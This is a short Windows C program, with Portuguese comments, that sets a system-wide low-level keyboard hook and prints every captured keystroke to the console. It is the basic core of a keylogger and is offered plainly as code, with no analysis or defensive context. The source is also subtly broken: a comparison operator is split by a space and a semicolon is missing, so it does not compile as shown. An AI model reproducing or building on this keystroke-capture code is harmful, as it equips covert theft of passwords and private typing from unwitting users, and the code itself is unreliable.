/*Funções utilizadas https://learn.microsoft.com/en-us/windows/win32/api/winuser

	SetWindowsHookEx();
	UnhookWindowsHookEx();
	CallNextHookEx();

*/

#include <stdio.h>
#include <windows.h>

HHOOK hook;
/*
HHOOK SetWindowsHookExA(
	int       idHook,
	HOOKPROC  lpfn,
	HINSTANCE hmod,
	DWORD     dwThreadId
);
*/

LRESULT CALLBACK funcHook(int cod, WPARAM wParam, LPARAM lParam);

int main(void) {

	MSG msg;
	hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);
	if (hook == NULL) {
		printf("\n");
		return(1);
	}
	while(GetMessage(&msg, NULL, 0, 0) ! = 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK funcHook(int cod, WPARAM wParam, LPARAM lParam){
	char ch;

	PKBDLLHOOKSTRUCT kDllHook = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && cod == HC_ACTION) {
		if (!GetAsyncKeyState(VK_SHIFT)){
			ch = kDllHook->vkCode + 32;
		}
		else{
			ch = kDllHook->vkCode
		}
		printf("%c", ch);
	}
	return(CallNextHookEx(hook, cod, wParam, lParam));
}
